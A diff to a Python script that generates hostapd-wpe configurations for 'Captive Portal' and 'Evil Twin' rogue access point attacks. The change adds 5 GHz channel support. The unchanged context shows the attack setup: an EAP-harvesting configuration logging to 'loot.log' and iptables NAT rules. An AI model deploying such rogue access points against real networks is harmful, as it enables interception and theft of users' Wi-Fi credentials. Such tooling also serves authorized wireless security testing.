@@ -27,16 +27,26 @@ def main():
     wpa = args.wpa
     #template= args.template
     workspace = args.database
+    hw_mode = ''
+    fiveGhz_channels = ["36", "38", "40", "42", "44", "46", "48", "50", "52", "54", "56", "58", "60", "62", "64", "66", "68", "70", "72", "74", "76", "78", "80", "82", "84", "86", "88", "90", "92", "94", "96", "98", "100", "102", "104", "106", "108", "110", "112", "114", "116", "118", "120", "122", "124", "126", "128", "132", "134", "136", "138", "140", "142", "144", "149", "151", "153", "155", "157", "159", "161", "163", "165"]
+    twofourGhz_channels = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14"]
 
     path = "module/hostapd/hostapd/"
 
 
     if attack in ["Captive Portal"]:
+        if channel in fiveGhz_channels:
+            hw_mode = "a"
+        elif channel in twofourGhz_channels:
+            hw_mode = "g"
+        else:
+            print "channel not found " + channel
+            return
         CHANNEL = ("channel="+channel+"\n")
         SSID = ("ssid="+ssid+"\n")
         IFACE = ("interface="+interface+"\n")
         auth = ("driver=nl80211\n"
-                "hw_mode=g\n"
+                "hw_mode=" + hw_mode +"\n"
                 "wmm_enabled=1\n"
                 "ctrl_interface=/var/run/hostapd\n"
                         )
@@ -72,6 +82,10 @@ def main():
         subprocess.call('iptables -A FORWARD -m mark --mark 99 -j REJECT', shell=True)
         subprocess.call('iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT', shell=True)
         subprocess.call('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', shell=True)
+
+        if hw_mode == "a":
+            IFACE += "country_code=US\nieee80211d=1\n"
+
         file = auth + SSID + CHANNEL + IFACE
         outfile = open(''+path+'hostapd-wpe.conf', 'w')
         outfile.write(file)
@@ -80,6 +94,13 @@ def main():
 
 
     if attack in ["Evil Twin"]:
+        if channel in fiveGhz_channels:
+            hw_mode = "a"
+        elif channel in twofourGhz_channels:
+            hw_mode = "g"
+        else:
+            print "channel not found " + channel
+            return
         auth = ("wpa_key_mgmt=WPA-EAP\n"
                                 "wpa_pairwise=TKIP CCMP\n"
                                 )
@@ -116,10 +137,12 @@ def main():
                 "pac_key_lifetime=604800\n"
                 "pac_key_refresh_time=86400\n"
                 "pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f\n"
-                "hw_mode=b\n"
+                "hw_mode=" + hw_mode +"\n"
                 "wpe_logfile=module/loot.log\n"
                 )
 
+        if hw_mode == "a":
+            hostapd += "country_code=US\nieee80211d=1\n"
         file = hostapd + auth + SSID + CHANNEL + IFACE + WPA
         outfile = open(''+path+'hostapd-wpe.conf', 'w')
         outfile.write(file)
